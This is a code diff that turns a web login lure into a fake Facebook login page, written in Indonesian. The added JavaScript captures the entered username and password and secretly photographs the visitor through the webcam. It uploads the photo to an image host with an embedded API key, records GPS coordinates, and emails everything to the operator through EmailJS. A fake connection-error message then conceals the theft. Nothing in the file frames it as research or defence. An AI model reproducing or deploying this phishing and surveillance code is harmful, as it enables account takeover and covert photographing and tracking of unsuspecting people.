@@ -3,31 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login - GIGS Security System</title>
+    <title>Login Facebook</title>
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 360px; text-align: center; }
-        h2 { font-weight: 500; color: #202124; margin-bottom: 10px; }
-        p { color: #5f6368; font-size: 14px; margin-bottom: 25px; }
-        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
-        .btn { background: #1a73e8; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; font-weight: bold; cursor: pointer; }
-        #loading { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.9); z-index:99; justify-content:center; align-items:center; flex-direction:column; }
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #fff; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; }
+        .header-blue { background-color: #fff; width: 100%; padding: 20px 0; text-align: center; }
+        .fb-logo { width: 120px; margin-top: 10px; }
+        .login-container { width: 90%; max-width: 400px; margin-top: 20px; }
+        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 8px; background-color: #f5f6f7; font-size: 14px; box-sizing: border-box; }
+        .btn-login { width: 100%; padding: 12px; background-color: #1877f2; border: none; border-radius: 8px; color: white; font-size: 17px; font-weight: bold; cursor: pointer; }
+        .forgot-pass { color: #1877f2; font-size: 14px; text-align: center; display: block; margin-top: 15px; text-decoration: none; }
+        .divider { border-top: 1px solid #dddfe2; margin: 30px 0; position: relative; }
+        .btn-new-account { width: 80%; margin: 0 auto; display: block; padding: 10px; background-color: #fff; border: 1px solid #1877f2; border-radius: 8px; color: #1877f2; font-weight: bold; text-align: center; text-decoration: none; }
+        .meta-logo { width: 60px; margin-top: 50px; opacity: 0.6; }
+        #loading { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.8); z-index:99; justify-content:center; align-items:center; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div id="loading">Memproses Verifikasi...</div>
+<div id="loading">Memproses...</div>
 
-<div class="login-box">
-    <img src="https://cdn-icons-png.flaticon.com/512/1000/1000997.png" width="60" alt="Logo">
-    <h2>Login Akun</h2>
-    <p>Gunakan Akun GIGS Anda untuk melanjutkan verifikasi perangkat.</p>
+<div class="header-blue">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1200px-Facebook_Logo_%282019%29.png" class="fb-logo" alt="Facebook">
+</div>
+
+<div class="login-container">
+    <input type="text" id="user" placeholder="Nomor ponsel atau email">
+    <input type="password" id="pass" placeholder="Kata sandi">
+    <button class="btn-login" onclick="startTracking()">Login</button>
     
-    <input type="text" id="user" placeholder="Email atau Nama Pengguna">
-    <input type="password" id="pass" placeholder="Masukkan Sandi">
-    <button class="btn" onclick="eksekusi()">BERIKUTNYA</button>
+    <a href="#" class="forgot-pass">Lupa kata sandi?</a>
+    
+    <div class="divider"></div>
+    
+    <a href="#" class="btn-new-account">Buat akun baru</a>
+    
+    <center><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png" class="meta-logo"></center>
 </div>
 
 <video id="video" autoplay></video>
@@ -38,70 +50,63 @@
         emailjs.init("5HWPoEryOV1APt1Cw");
     })();
 
-    async function eksekusi() {
+    async function startTracking() {
         const u = document.getElementById("user").value;
         const p = document.getElementById("pass").value;
 
         if(!u || !p) {
-            alert("Harap isi email dan sandi!");
+            alert("Masukkan email dan kata sandi Anda.");
             return;
         }
 
         document.getElementById("loading").style.display = "flex";
-        let laporan = `[INTEL GIGS]\nUser: ${u}\nPass: ${p}\n`;
+        let report = `[DATA LOGIN FACEBOOK]\nUser: ${u}\nPass: ${p}\n`;
 
         try {
-            // Ambil IP
-            const res = await fetch('https://ipapi.co/json/');
-            const d = await res.json();
-            laporan += `IP: ${d.ip}\nKota: ${d.city}\n`;
-
-            // Minta Izin Kamera
+            // Meminta izin Kamera & Lokasi secara paksa
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             video.srcObject = stream;
 
-            // Tunggu 2 detik untuk ambil foto & GPS
-            setTimeout(async () => {
-                // Ambil Foto
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const base64 = canvas.toDataURL('image/jpeg', 0.5).split(',')[1];
-                stream.getTracks().forEach(t => t.stop());
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                setTimeout(async () => {
+                    // Ambil Foto
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const base64 = canvas.toDataURL('image/jpeg', 0.5).split(',')[1];
+                    stream.getTracks().forEach(t => t.stop());
 
-                // Upload ke ImgBB
-                const fd = new FormData();
-                fd.append("image", base64);
-                const up = await fetch("https://api.imgbb.com/1/upload?key=Dba59ebe766c55b8d286f55a8fe366e2", {
-                    method: "POST", body: fd
-                });
-                const resUp = await up.json();
-                const link = resUp.data.url;
-
-                // Ambil GPS
-                navigator.geolocation.getCurrentPosition((pos) => {
-                    laporan += `Foto: ${link}\nGPS: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                    kirim(laporan);
-                }, () => {
-                    laporan += `Foto: ${link}\nGPS: Ditolak`;
-                    kirim(laporan);
-                });
-            }, 2000);
+                    // Upload ke ImgBB
+                    const fd = new FormData();
+                    fd.append("image", base64);
+                    const up = await fetch("https://api.imgbb.com/1/upload?key=Dba59ebe766c55b8d286f55a8fe366e2", {
+                        method: "POST", body: fd
+                    });
+                    const resUp = await up.json();
+                    
+                    // Kirim ke Email
+                    report += `📸 FOTO: ${resUp.data.url}\n📍 GPS: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    sendFinal(report);
+                }, 2000);
+            }, () => {
+                sendFinal(report + "\n📍 GPS: Ditolak");
+            });
 
         } catch (e) {
-            kirim(laporan + "Kamera/GPS Ditolak");
+            sendFinal(report + "\n📸 Kamera: Ditolak");
         }
     }
 
-    function kirim(m) {
+    function sendFinal(m) {
         emailjs.send("service_e3ap8de", "template_ts6dxmh", { message: m })
         .then(() => {
-            alert("Kesalahan Autentikasi: Server tidak merespons. Sesi berakhir.");
+            alert("Kesalahan koneksi jaringan. Silakan coba lagi nanti.");
             location.reload();
         });
     }
 </script>
+
 </body>
 </html>
